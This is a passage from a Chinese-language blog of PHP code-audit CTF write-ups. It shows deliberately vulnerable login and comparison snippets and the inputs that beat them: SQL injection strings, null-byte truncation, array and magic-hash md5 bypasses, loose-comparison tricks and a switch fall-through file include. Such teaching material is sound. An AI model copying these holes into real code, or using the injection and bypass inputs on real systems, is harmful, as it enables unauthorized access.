class="string">"^[1-9]+$"</span>, $_GET[<span class="string">'nctf'</span>]) === <span class="keyword">FALSE</span>)</div><div class="line">            <span class="keyword">echo</span> <span class="string">'必须输入数字才行'</span>;</div><div class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'nctf'</span>], <span class="string">'#biubiubiu'</span>) !== <span class="keyword">FALSE</span>)   </div><div class="line">            <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</div><div class="line">        <span class="keyword">else</span></div><div class="line">            <span class="keyword">echo</span> <span class="string">'骚年，继续努力吧啊~'</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line"> <span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>writeup</strong></p><ul><li><p>方法一：<br>既要是纯数字,又要有<code>’#biubiubiu’</code>，<code>strpos()</code>找的是字符串,那么传一个数组给它,<code>strpos()</code>出错返回<code>null,null!==false</code>,所以符合要求.<br>所以输入<code>nctf[]=</code><br>那为什么<code>ereg()</code>也能符合呢?因为<code>ereg()</code>在出错时返回的也是<code>null</code>,<code>null!==false</code>,所以符合要求.</p></li><li><p>方法二：<br>字符串截断,利用<code>ereg()</code>的<code>NULL</code>截断漏洞，绕过正则过滤<br><code>http://localhost/php_bugs/16.php?nctf=1%00#biubiubiu</code> 错误<br>需将#编码<br><code>http://localhost/php_bugs/16.php?nctf=1%00%23biubiubiu</code><br>正确</p></li></ul><h2 id="16-SQL注入or绕过"><a href="#16-SQL注入or绕过" class="headerlink" title="16 SQL注入or绕过"></a>16 SQL注入or绕过</h2><p><strong>code</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="comment">#GOAL: login as admin,then get the flag;</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"><span class="keyword">require</span> <span class="string">'db.inc.php'</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span><span class="params">($str)</span></span>&#123;</div><div class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123; <span class="comment">//get_magic_quotes_gpc — 获取当前 magic_quotes_gpc 的配置选项设置</span></div><div class="line">        $str=stripslashes($str); <span class="comment">//返回一个去除转义反斜线后的字符串（\' 转换为 ' 等等）。双反斜线（\\）被转换为单个反斜线（\）。 </span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> htmlentities($str, ENT_QUOTES);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$username = @clean((string)$_GET[<span class="string">'username'</span>]);</div><div class="line">$password = @clean((string)$_GET[<span class="string">'password'</span>]);</div><div class="line"></div><div class="line"><span class="comment">//$query='SELECT * FROM users WHERE name=\''admin\'\' AND pass=\''or 1 #'\';';</span></div><div class="line"></div><div class="line">$query=<span class="string">'SELECT * FROM users WHERE name=\''</span>.$username.<span class="string">'\' AND pass=\''</span>.$password.<span class="string">'\';'</span>;</div><div class="line">$result=mysql_query($query);</div><div class="line"><span class="keyword">if</span>(!$result || mysql_num_rows($result) &lt; <span class="number">1</span>)&#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'Invalid password!'</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">echo</span> $flag;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p></p><p><strong>writeup</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$query='<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">name</span>=\<span class="string">''</span><span class="keyword">admin</span>\<span class="string">'\' AND pass=\''</span><span class="keyword">or</span> <span class="number">1</span> #<span class="string">'\';'</span>;</div></pre></td></tr></table></figure><p><code>?username=admin\&#39;\&#39; AND pass=\&#39;&#39;or 1 #&amp;password=</code></p><h2 id="17-密码md5比较绕过"><a href="#17-密码md5比较绕过" class="headerlink" title="17 密码md5比较绕过"></a>17 密码md5比较绕过</h2><p><strong>code</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</div><div class="line">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</div><div class="line">  mysql_select_db(SAE_MYSQL_DB);</div><div class="line">  $user = $_POST[user];</div><div class="line">  $pass = md5($_POST[pass]);</div><div class="line">  $query = @mysql_fetch_array(mysql_query(<span class="string">"select pw from ctf where user=' $user '"</span>));</div><div class="line">  <span class="keyword">if</span> (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;</div><div class="line"></div><div class="line">    <span class="comment">//strcasecmp:0 - 如果两个字符串相等</span></div><div class="line"></div><div class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! Key: flag&#123;**************&#125; &lt;/p&gt;"</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;Log in failure!&lt;/p&gt;"</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p></p><p><strong>writeup</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">//select pw from ctf where user=&apos;&apos;and 0=1 union select  &apos;e10adc3949ba59abbe56e057f20f883e&apos; #</div></pre></td></tr></table></figure><p></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?user='and 0=1 union <span class="keyword">select</span>  <span class="string">'e10adc3949ba59abbe56e057f20f883e'</span> #&amp;pass=<span class="number">123456</span></div></pre></td></tr></table></figure><h2 id="18-md5-函数-使用数组绕过"><a href="#18-md5-函数-使用数组绕过" class="headerlink" title="18 md5()函数===使用数组绕过"></a>18 md5()函数===使用数组绕过</h2><p><strong>code</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">$flag = <span class="string">'flag&#123;test&#125;'</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</div><div class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'username'</span>] == $_GET[<span class="string">'password'</span>])</div><div class="line">        <span class="keyword">print</span> <span class="string">'Your password can not be your username.'</span>;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (md5($_GET[<span class="string">'username'</span>]) === md5($_GET[<span class="string">'password'</span>]))</div><div class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="keyword">print</span> <span class="string">'Invalid password'</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>writeup</strong></p><p>若为<code>md5($_GET[&#39;username&#39;]) == md5($_GET[&#39;password&#39;])</code><br>则可以构造：<br><code>http://localhost/php_bugs/18.php?username=QNKCDZO&amp;password=240610708</code><br>因为<code>==</code>对比的时候会进行数据转换，<code>0eXXXXXXXXXX</code> 转成<code>0</code>了<br>也可以使用数组绕过<br><code>http://localhost/php_bugs/18.php?username[]=1&amp;password[]=2</code></p><p>但此处是<code>===</code>，只能用数组绕过，<code>PHP</code>对数组进行<code>hash</code>计算都会得出<code>null</code>的空值<br><code>http://localhost/php_bugs/18.php?username[]=1&amp;password[]=2</code></p><h2 id="19-ereg-函数strpos-函数用数组返回NULL绕过"><a href="#19-ereg-函数strpos-函数用数组返回NULL绕过" class="headerlink" title="19 ereg()函数strpos() 函数用数组返回NULL绕过"></a>19 ereg()函数strpos() 函数用数组返回NULL绕过</h2><p><strong>code</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span>  </div><div class="line"></div><div class="line">$flag = <span class="string">"flag"</span>;  </div><div class="line">   </div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;  </div><div class="line">    <span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)  </div><div class="line">        <span class="keyword">echo</span> <span class="string">'You password must be alphanumeric'</span>;  </div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'--'</span>) !== <span class="keyword">FALSE</span>)  </div><div class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span> . $flag);  </div><div class="line">    <span class="keyword">else</span>  </div><div class="line">        <span class="keyword">echo</span> <span class="string">'Invalid password'</span>;  </div><div class="line">&#125;  </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p></p><p><strong>writeup</strong></p><ul><li><p>方法一：<br>ereg()正则函数可以用<code>%00</code>截断<br><code>http://localhost/php_bugs/19.php?password=1%00--</code></p></li><li><p>方法二：<br>将<code>password</code>构造一个<code>arr[]</code>，传入之后，<code>ereg</code>是返回<code>NULL</code>的，<code>===</code>判断<code>NULL</code>和 <code>FALSE</code>，是不相等的，所以可以进入第二个判断，而<code>strpos</code>处理数组，也是返回<code>NULL</code>，注意这里的是<code>!==</code>，<code>NULL!==FALSE</code>,条件成立，拿到<code>flag</code><br><code>http://localhost/php_bugs/19.php?password[]=</code></p></li></ul><h2 id="20-十六进制与数字比较"><a href="#20-十六进制与数字比较" class="headerlink" title="20 十六进制与数字比较"></a>20 十六进制与数字比较</h2><p><strong>code</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span><span class="params">($temp)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    $flag = <span class="string">'flag&#123;test&#125;'</span>;</div><div class="line">    $one = ord(<span class="string">'1'</span>);  <span class="comment">//ord — 返回字符的 ASCII 码值</span></div><div class="line">    $nine = ord(<span class="string">'9'</span>); <span class="comment">//ord — 返回字符的 ASCII 码值</span></div><div class="line">    $number = <span class="string">'3735929054'</span>;</div><div class="line">    <span class="comment">// Check all the input characters!</span></div><div class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</div><div class="line">    &#123; </div><div class="line">        <span class="comment">// Disallow all the digits!</span></div><div class="line">        $digit = ord($temp&#123;$i&#125;);</div><div class="line">        <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</div><div class="line">        &#123;</div><div class="line">            <span class="comment">// Aha, digit not allowed!</span></div><div class="line">            <span class="keyword">return</span> <span class="string">"flase"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>($number == $temp)</div><div class="line">        <span class="keyword">return</span> $flag;</div><div class="line">&#125;</div><div class="line">$temp = $_GET[<span class="string">'password'</span>];</div><div class="line"><span class="keyword">echo</span> noother_says_correct($temp);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p></p><p><strong>writeup</strong></p><p>这里，它不让输入1到9的数字，但是后面却让比较一串数字，平常的方法肯定就不能行了，大家都知道计算机中的进制转换，当然也是可以拿来比较的，<code>0x</code>开头则表示<code>16</code>进制，将这串数字转换成<code>16</code>进制之后发现，是d<code>eadc0de</code>，在开头加上<code>0x</code>，代表这个是<code>16</code>进制的数字，然后再和十进制的 <code>3735929054</code>比较，答案当然是相同的，返回<code>true</code>拿到<code>flag</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">echo  dechex ( 3735929054 ); // 将3735929054转为16进制</div><div class="line">结果为：deadc0de</div></pre></td></tr></table></figure><p>构造：<br><code>http://localhost/php_bugs/20.php?password=0xdeadc0de</code></p><h2 id="21-数字验证正则绕过"><a href="#21-数字验证正则绕过" class="headerlink" title="21 数字验证正则绕过"></a>21 数字验证正则绕过</h2><p><strong>code</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">$flag = <span class="string">'flag&#123;test&#125;'</span>;</div><div class="line"><span class="keyword">if</span>  (<span class="string">"POST"</span> == $_SERVER[<span class="string">'REQUEST_METHOD'</span>]) </div><div class="line">&#123; </div><div class="line">    $password = $_POST[<span class="string">'password'</span>]; </div><div class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt;= preg_match(<span class="string">'/^[[:graph:]]&#123;12,&#125;$/'</span>, $password)) <span class="comment">//preg_match — 执行一个正则表达式匹配</span></div><div class="line">    &#123; </div><div class="line">        <span class="keyword">echo</span> <span class="string">'Wrong Format'</span>; </div><div class="line">        <span class="keyword">exit</span>; </div><div class="line">    &#125; </div><div class="line">    <span class="keyword">while</span> (<span class="keyword">TRUE</span>) </div><div class="line">    &#123; </div><div class="line">        $reg = <span class="string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span>; </div><div class="line">        <span class="keyword">if</span> (<span class="number">6</span> &gt; preg_match_all($reg, $password, $arr)) </div><div class="line">            <span class="keyword">break</span>; </div><div class="line">        $c = <span class="number">0</span>; </div><div class="line">        $ps = <span class="keyword">array</span>(<span class="string">'punct'</span>, <span class="string">'digit'</span>, <span class="string">'upper'</span>, <span class="string">'lower'</span>); <span class="comment">//[[:punct:]] 任何标点符号 [[:digit:]] 任何数字  [[:upper:]] 任何大写字母  [[:lower:]] 任何小写字母 </span></div><div class="line">        <span class="keyword">foreach</span> ($ps <span class="keyword">as</span> $pt) </div><div class="line">        &#123; </div><div class="line">            <span class="keyword">if</span> (preg_match(<span class="string">"/[[:$pt:]]+/"</span>, $password)) </div><div class="line">                $c += <span class="number">1</span>; </div><div class="line">        &#125; </div><div class="line">        <span class="keyword">if</span> ($c &lt; <span class="number">3</span>) <span class="keyword">break</span>; </div><div class="line">        <span class="comment">//&gt;=3，必须包含四种类型三种与三种以上</span></div><div class="line">        <span class="keyword">if</span> (<span class="string">"42"</span> == $password) <span class="keyword">echo</span> $flag; </div><div class="line">        <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">'Wrong password'</span>; </div><div class="line">        <span class="keyword">exit</span>; </div><div class="line">    &#125; </div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>writeup</strong></p><p><code>0 &gt;= preg_match(&#39;/^[[:graph:]]{12,}$/&#39;, $password)</code><br>意为必须是12个字符以上（非空格非TAB之外的内容）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;; </div><div class="line">if (6 &gt; preg_match_all($reg, $password, $arr))</div></pre></td></tr></table></figure><p>意为匹配到的次数要大于6次</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ps = array(&apos;punct&apos;, &apos;digit&apos;, &apos;upper&apos;, &apos;lower&apos;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字  [[:upper:]] 任何大写字母  [[:lower:]] 任何小写字母 </div><div class="line">foreach ($ps as $pt) </div><div class="line">&#123; </div><div class="line">    if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password)) </div><div class="line">        $c += 1; </div><div class="line">&#125; </div><div class="line">if ($c &lt; 3) break;</div></pre></td></tr></table></figure><p>意为必须要有大小写字母，数字，字符内容三种与三种以上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if (&quot;42&quot; == $password) echo $flag;</div></pre></td></tr></table></figure><p>意为必须等于<code>42</code></p><p>答案：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">42.00e+00000000000 </div><div class="line">或</div><div class="line">420.000000000e-1</div></pre></td></tr></table></figure><p></p><p>资料：</p><ul><li><p><a href="http://bobao.360.cn/learning/detail/248.html" target="_blank" rel="external">安全宝「约宝妹」代码审计CTF题解</a></p></li><li><p><a href="https://3v4l.org/jYSpC" target="_blank" rel="external">各种版本PHP在线迷你运行脚本</a></p></li><li><p><a href="http://php.net/manual/en/language.operators.comparison.php" target="_blank" rel="external">PHP Comparison Operators</a></p></li></ul><h2 id="22-弱类型整数大小比较绕过"><a href="#22-弱类型整数大小比较绕过" class="headerlink" title="22 弱类型整数大小比较绕过"></a>22 弱类型整数大小比较绕过</h2><p><strong>code</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">$flag = <span class="string">"flag&#123;test&#125;"</span>;</div><div class="line"></div><div class="line">$temp = $_GET[<span class="string">'password'</span>];</div><div class="line">is_numeric($temp)?<span class="keyword">die</span>(<span class="string">"no numeric"</span>):<span class="keyword">NULL</span>;    </div><div class="line"><span class="keyword">if</span>($temp&gt;<span class="number">1336</span>)&#123;</div><div class="line">    <span class="keyword">echo</span> $flag;</div><div class="line">&#125; </div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p></p><p><strong>writeup</strong></p><p><code>is_numeric($temp)?die(&quot;no numeric&quot;):NULL;</code><br>不能是数字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">if($temp&gt;1336)&#123;</div><div class="line">    echo $flag;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>又要大于<code>1336</code></p><p>利用<code>PHP</code>弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型<code>intval</code>再比。如果输入一个<code>1337a</code>这样的字符串，在<code>is_numeric</code>中返回<code>true</code>，然后在比较时被转换成数字<code>1337</code>，这样就绕过判断输出<code>flag</code>。</p><p><code>http://localhost/php_bugs/22.php?password=1337a</code></p><h2 id="23-md5函数验证绕过"><a href="#23-md5函数验证绕过" class="headerlink" title="23 md5函数验证绕过"></a>23 md5函数验证绕过</h2><p><strong>code</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">$flag = <span class="string">'flag&#123;test&#125;'</span>;</div><div class="line">$temp = $_GET[<span class="string">'password'</span>];</div><div class="line"><span class="keyword">if</span>(md5($temp)==<span class="number">0</span>)&#123;</div><div class="line">    <span class="keyword">echo</span> $flag;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><code>if(md5($temp)==0)</code><br>要使<code>md5</code>函数加密值为<code>0</code></p><p><strong>writeup</strong></p><ul><li><p>方法一：<br>使<code>password</code>不赋值，为<code>NULL</code>，<code>NULL == 0</code>为<code>true</code><br><code>http://localhost/php_bugs/23.php?password=</code><br><code>http://localhost/php_bugs/23.php</code></p></li><li><p>方法二：<br>经过MD5运算后，为<code>0e******</code>的形式，其结果为<code>0*10</code>的<code>n</code>次方，结果还是零<br><code>http://localhost/php_bugs/23.php?password=240610708</code><br><code>http://localhost/php_bugs/23.php?password=QNKCDZO</code></p></li></ul><h2 id="24-md5函数true绕过注入"><a href="#24-md5函数true绕过注入" class="headerlink" title="24 md5函数true绕过注入"></a>24 md5函数true绕过注入</h2><p><strong>code</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">$link = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>);</div><div class="line"><span class="keyword">if</span> (!$link) &#123; </div><div class="line">  <span class="keyword">die</span>(<span class="string">'Could not connect to MySQL: '</span> . mysql_error()); </div><div class="line">&#125; </div><div class="line"><span class="comment">// 选择数据库</span></div><div class="line">$db = mysql_select_db(<span class="string">"security"</span>, $link);</div><div class="line"><span class="keyword">if</span>(!$db)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">echo</span> <span class="string">'select db error'</span>;</div><div class="line">  <span class="keyword">exit</span>();</div><div class="line">&#125;</div><div class="line"><span class="comment">// 执行sql</span></div><div class="line">$password = $_GET[<span class="string">'password'</span>];</div><div class="line">$sql = <span class="string">"SELECT * FROM users WHERE password = '"</span>.md5($password,<span class="keyword">true</span>).<span class="string">"'"</span>;</div><div class="line">var_dump($sql);</div><div class="line"><span class="comment">// SELECT * FROM users WHERE password = '276f722736c95d99e921722cf9ed621c'</span></div><div class="line">$result=mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</div><div class="line">$row1 = mysql_fetch_row($result);</div><div class="line">var_dump($row1);</div><div class="line">mysql_close($link);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p></p><p><strong>writeup</strong></p><p><code>$sql = &quot;SELECT * FROM users WHERE password = &#39;&quot;.md5($password,true).&quot;&#39;&quot;;</code><br><code>md5($password,true)</code><br>将<code>md5</code>后的<code>hex</code>转换成字符串</p><p>如果包含<code>&#39;or&#39;xxx</code>这样的字符串，那整个<code>sql</code>变成</p><p><code>SELECT * FROM admin WHERE pass = &#39;&#39;or&#39;xxx&#39;</code>就绕过了</p><p>字符串：<code>ffifdyop</code></p><p><code>md5</code>后，<code>276f722736c95d99e921722cf9ed621c</code><br><code>hex</code>转换成字符串：<code>&#39;or&#39;6&lt;trash&gt;</code></p><p>构造：<code>?password=ffifdyop</code></p><p>资料：</p><ul><li><p><a href="http://www.w3school.com.cn/php/func_string_md5.asp" target="_blank" rel="external">PHP md5() 函数</a></p></li><li><p><a href="http://blog.csdn.net/greyfreedom/article/details/45846137" target="_blank" rel="external">MD5加密后的SQL 注入</a></p></li><li><p><a href="http://www.am0s.com/functions/204.html" target="_blank" rel="external">敏感函数md5()</a></p></li><li><p><a href="http://www.xmanblog.net/2017/04/04/php-magic/" target="_blank" rel="external">php黑魔法</a></p></li></ul><h2 id="25-switch没有break-字符与0比较绕过"><a href="#25-switch没有break-字符与0比较绕过" class="headerlink" title="25 switch没有break 字符与0比较绕过"></a>25 switch没有break 字符与0比较绕过</h2><p><strong>code</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="comment">// error_reporting(0);</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'which'</span>]))</div><div class="line">&#123;</div><div class="line">    $which = $_GET[<span class="string">'which'</span>];</div><div class="line">    <span class="keyword">switch</span> ($which)</div><div class="line">    &#123;</div><div class="line">    <span class="keyword">case</span> <span class="number">0</span>:</div><div class="line">    <span class="keyword">print</span>(<span class="string">'arg'</span>);</div><div class="line">    <span class="comment">// break;</span></div><div class="line">    <span class="keyword">case</span> <span class="number">1</span>:</div><div class="line">    <span class="keyword">case</span> <span class="number">2</span>:</div><div class="line">        <span class="keyword">require_once</span> $which.<span class="string">'.php'</span>;</div><div class="line">         <span class="keyword">echo</span> $flag;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    <span class="keyword">default</span>:</div><div class="line">        <span class="keyword">echo</span> GWF_HTML::error(<span class="string">'PHP-0817'</span>, <span class="string">'Hacker NoNoNo!'</span>, <span class="keyword">false</span>);</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>writeup</strong></p><p>让我们包含当前目录中的<code>flag.php</code>，给<code>which</code>为<code>flag</code>，这里会发现在<code>case 0</code>和<code>case 1</code>的时候，没有<code>break</code>，按照常规思维，应该是<code>0</code>比较不成功，进入比较<code>1</code>，然后比较<code>2</code>，再然后进入<code>default</code>，但是事实却不是这样，事实上，在 <code>case 0</code>的时候，字符串和<code>0</code>比较是相等的，进入了<code>case 0</code>的方法体，但是却没有<code>break</code>，这个时候，默认判断已经比较成功了，而如果匹配成功之后，会继续执行后面的语句，这个时候，是不会再继续进行任何判断的。也就是说，我们<code>which</code>传入<code>flag</code>的时候，<code>case 0</code>比较进入了方法体，但是没有<code>break</code>，默认已经匹配成功，往下执行不再判断，进入<code>2</code>的时候，执行了<code>require_once flag.php</code></p><p>PHP中非数字开头字符串和数字 